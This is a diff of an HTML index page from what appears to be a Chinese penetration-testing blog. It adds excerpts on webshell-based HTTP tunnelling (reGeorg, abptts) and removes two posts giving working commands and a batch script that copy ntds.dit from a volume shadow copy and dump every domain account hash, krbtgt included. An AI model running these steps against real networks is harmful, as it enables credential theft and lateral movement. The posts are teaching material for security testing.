@@ -309,6 +309,396 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/http-tunnel-question.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="VK">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Evil-404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/http-tunnel-question.html" itemprop="url">通向彼岸 之内网代理转发 [ http隧道篇 使用过程中容易出现的一些问题 ]</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-09-17T10:10:10+08:00">
+                2016-09-17
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-11-08T16:36:01+08:00">
+                2017-11-08
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/http-tunnel/" itemprop="url" rel="index">
+                    <span itemprop="name">http tunnel</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  575
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p><br><br>关于使用http隧道代理脚本时,容易出现的一些错误及解决办法</p>
+<p>0x01 如果是php程序,你可能需要先确保php.ini中的socket模块已正常开启并且可用,因为php中的socket函数要基于此模块,不过,reGeorg早已经提供了不再需要开启socket的代理脚本</p>
+<p>0x02 有时候你在绑定某些端口会遇到socket无法建立连接的问题,不妨尝试换一下端口,比如:53,8080,443,只要不跟目标系统中的现有端口冲突即可,尽量用一些穿透性比较好的端口</p>
+<p>0x03 有时还会遇到aspx 运行错误,看具体是什么错误,如果一眼解决不了,谷歌一下,解决办法肯定一大堆,比如:’Compilation Error’,可以尝试在代理脚本[即webshell]的当前所在目录,另外新建一个web.conf文件,一般也即可解决,文件具体内容如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.web&gt;</span><br><span class="line">  &lt;customErrors mode=<span class="string">"Off"</span>/&gt;</span><br><span class="line">  &lt;<span class="regexp">/system.web&gt;</span></span><br><span class="line"><span class="regexp">&lt;/configuration</span>&gt;</span><br></pre></td></tr></table></figure></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/http-tunnel-question.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/abptts-http-tunnel.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="VK">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Evil-404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/abptts-http-tunnel.html" itemprop="url">通向彼岸 之内网代理转发 [ http隧道篇 abptts ]</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-09-16T10:01:19+08:00">
+                2016-09-16
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-11-11T20:04:20+08:00">
+                2017-11-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/http-tunnel/" itemprop="url" rel="index">
+                    <span itemprop="name">http tunnel</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  519
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;abptts,一款基于ssl加密的http隧道工具,相对来讲还算稳定,就个人实际使用来说起码比regerog都要稳定一些,且全程通信数据加密,能一定程度上对抗取证检测,单就这一点来说,还是很赞的,不过,加不加密,它自己说的不算,还是老办法,拿wireshark自己耐心跑一遍,就一目了然了,尽量用事实说话嘛 </p>
+<p>0x02 首先,安装好工具所需的各种py依赖库:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pip install pycrypto    加密库,整个通信数据加密基本都要靠这个库来实现</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pip install httplib2</span></span><br></pre></td></tr></table></figure></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/abptts-http-tunnel.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/regerog-http-tunnel.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1983,409 +2373,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/powershell-domainhash.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="VK">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Evil-404">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/powershell-domainhash.html" itemprop="url">完整导出域内用户hash小记 [powershell离线提取域内所有账户hash]</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-08-16T01:46:52+08:00">
-                2016-08-16
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">更新于&#58;</span>
-              
-              <time title="更新于" itemprop="dateModified" datetime="2017-10-26T11:07:09+08:00">
-                2017-10-26
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/domainhash/" itemprop="url" rel="index">
-                    <span itemprop="name">domainhash</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  219
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用 DSInternals PowerShell</span><br></pre></td></tr></table></figure></p>
-<p>本地测试环境:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win <span class="number">2012</span>r2</span><br></pre></td></tr></table></figure></p>
-<p>离线导出环境要求:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell <span class="number">3</span>+</span><br><span class="line">.NET Framework <span class="number">4.5</span>+</span><br></pre></td></tr></table></figure></p>
-<p>支持的系统:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Server <span class="number">2012</span> R2</span><br><span class="line">Windows Server <span class="number">2008</span> R2</span><br><span class="line">Windows <span class="number">10</span> <span class="number">64</span>-bit</span><br><span class="line">Windows <span class="number">8.1</span> <span class="number">64</span>-bit</span><br><span class="line">Windows <span class="number">7</span> <span class="number">64</span>-bit</span><br></pre></td></tr></table></figure></p>
-<p>先看下当前系统的powershell版本:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps &gt; Get-Host <span class="params">| Select-Object Version</span></span><br></pre></td></tr></table></figure></p>
-<p>放开pwoershell脚本执行限制:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/powershell domainhash version.png" alt=""><br></p>
-<p>准备好ntds.dit和SYSTEM.hiv文件:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntds.dit [可以利用shadowcopy.bat快速获取]</span><br><span class="line">system.hiv [reg即可获取]</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure></p>
-<p>安装,导入DSInternals模块:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd DSInternals</span><br><span class="line">powershell</span><br><span class="line">Import-Module .\DSInternals</span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/powershell domainhash ntds system.png" alt=""></p>
-<p>直接导出域内所有用户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></span><br><span class="line">Get-ADDBAccount -All -DBPath <span class="string">"C:\ntds.dit"</span> -BootKey $key <span class="params">| Out-File hash.txt</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/powershell domainhash hashres.png" alt=""></p>
-<p>也可只获取指定账户的详细信息<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></span><br><span class="line">Get-ADDBAccount -DistinguishedName <span class="string">'CN=krbtgt,CN=Users,DC=klionsec,DC=org'</span>  -DBPath <span class="string">'C:\ntds.dit'</span> -BootKey $key</span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/powershell domainhash krbrgethash.png" alt=""><br></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/shadow-copy-hash.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="VK">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Evil-404">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/shadow-copy-hash.html" itemprop="url">完整导出域内用户hash小记 [vshadow + ShadowCopy + QuarksPwDump]</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-08-15T00:08:14+08:00">
-                2016-08-15
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">更新于&#58;</span>
-              
-              <time title="更新于" itemprop="dateModified" datetime="2017-11-30T21:52:46+08:00">
-                2017-11-30
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/domainhash/" itemprop="url" rel="index">
-                    <span itemprop="name">domainhash</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  309
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><br><br>利用vsshadow <code>[ 微软的卷影拷贝工具 ]</code>,来复制出ntds.dit,从而导出域内所有用户hash,本地虽然没问题,但实际测试中有时候会不好使</p>
-<p>第一步:将三个工具都传到目标机器的同一目录下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe + ShadowCopy.bat + QuarksPwDump.exe</span><br></pre></td></tr></table></figure></p>
-<p>shadowcopy.cat:<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setlocal</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">NOT</span> "<span class="variable">%CALLBACK_SCRIPT%</span>"=="" <span class="keyword">goto</span> :IS_CALLBACK</span><br><span class="line"><span class="built_in">set</span> SOURCE_DRIVE_LETTER=<span class="variable">%SystemDrive%</span></span><br><span class="line"><span class="built_in">set</span> SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit</span><br><span class="line"><span class="built_in">set</span> DESTINATION_PATH=%~dp0</span><br><span class="line">@<span class="built_in">echo</span> ...Determine the scripts to be executed/generated...</span><br><span class="line"><span class="built_in">set</span> CALLBACK_SCRIPT=%~dpnx0</span><br><span class="line"><span class="built_in">set</span> TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.<span class="built_in">cmd</span></span><br><span class="line">@<span class="built_in">echo</span> ...Creating the shadow <span class="built_in">copy</span>...</span><br><span class="line">"%~dp0vshadow.exe" -script=<span class="variable">%TEMP_GENERATED_SCRIPT%</span> -exec="<span class="variable">%CALLBACK_SCRIPT%</span>" <span class="variable">%SOURCE_DRIVE_LETTER%</span></span><br><span class="line"><span class="built_in">del</span> /f <span class="variable">%TEMP_GENERATED_SCRIPT%</span></span><br><span class="line">@<span class="keyword">goto</span> :EOF</span><br><span class="line">:IS_CALLBACK</span><br><span class="line"><span class="built_in">setlocal</span></span><br><span class="line">@<span class="built_in">echo</span> ...Obtaining the shadow <span class="built_in">copy</span> device name...</span><br><span class="line"><span class="keyword">call</span> <span class="variable">%TEMP_GENERATED_SCRIPT%</span></span><br><span class="line">@<span class="built_in">echo</span> ...Copying from the shadow <span class="built_in">copy</span> to the destination <span class="built_in">path</span>...</span><br><span class="line"><span class="built_in">copy</span> "<span class="variable">%SHADOW_DEVICE_1%</span>\<span class="variable">%SOURCE_RELATIVE_PATH%</span>" <span class="variable">%DESTINATION_PATH%</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/shadowcopy exec.png" alt=""><br><br><img src="/img/shadowcopy exec res.png" alt=""><br></p>
-<p>第二步:然后以管理员权限运行ShadowCopy.bat脚本,之后提取的ntds.dit会被复制到当前目录,利用esentutl工具修复ntds.dit文件<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/shadowcopy esentutl.png" alt=""><br></p>
-<p>第三步:利用QuarksPwDump 读取修复后的ntds.dit文件,导出域内所有账户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system system.hive 同样还是先导出syskey</span><br><span class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file <span class="symbol">c:</span>\ntds.dit --system-file <span class="symbol">c:</span>\system.hive -o <span class="symbol">c:</span>\res.txt 一定要注意这里要给绝对路径,选项参数之间只能有一个空格</span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/shadowcopy hash.png" alt=""><br></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2435,7 +2427,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">159</span>
+                  <span class="site-state-item-count">161</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2446,7 +2438,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">112</span>
+                  <span class="site-state-item-count">114</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2457,7 +2449,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">107</span>
+                  <span class="site-state-item-count">109</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -2605,7 +2597,7 @@ show_date_time();
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共299.2k字</span>
+  <span class="post-count">博客全站共309.0k字</span>
 </div>
 
   
